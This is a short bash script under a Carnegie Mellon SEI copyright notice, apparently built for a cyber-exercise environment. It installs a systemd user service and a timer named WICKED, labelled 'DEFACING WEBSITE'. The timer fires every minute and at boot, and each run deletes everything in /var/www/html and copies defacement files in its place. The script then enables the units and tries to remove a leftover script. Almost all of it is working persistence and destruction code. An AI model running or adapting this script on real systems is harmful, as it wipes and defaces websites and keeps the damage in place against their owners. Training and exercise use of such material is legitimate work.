#!/bin/bash

# Copyright 2023 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.

mkdir -p ~/.config/systemd/
mkdir -p ~/.config/systemd/user/

cat <<EOF > ~/.config/systemd/user/WICKED.service
[Unit]
Description=DEFACING WEBSITE
After=network.target
StartLimitIntervalSec=0
[Service]
ExecStart=/bin/bash /home/$USER/.config/systemd_script.sh
[Install]
WantedBy=default.target
EOF

cat <<EOF > ~/.config/systemd/user/WICKED.timer
[Unit]
Description=DEFACING WEBSITE
[Timer]
Unit=WICKED.service
OnBootSec=5
OnCalendar=*-*-* *:*:00
[Install]
WantedBy=timers.target
EOF

cat <<EOF > ~/.config/systemd_script.sh
#!/bin/bash

rm -rf /var/www/html/*
cp -r /home/$USER/.config/deface/* /var/www/html/
EOF

chmod +x /home/$USER/.config/systemd_script.sh

systemctl --user daemon-reload
systemctl --user enable --now WICKED.service
systemctl --user enable --now WICKED.timer
systemctl --user start WICKED.service
systemctl --user start WICKED.timer

rm -rf ~/home/$USER/.config/systemd_vicious.sh


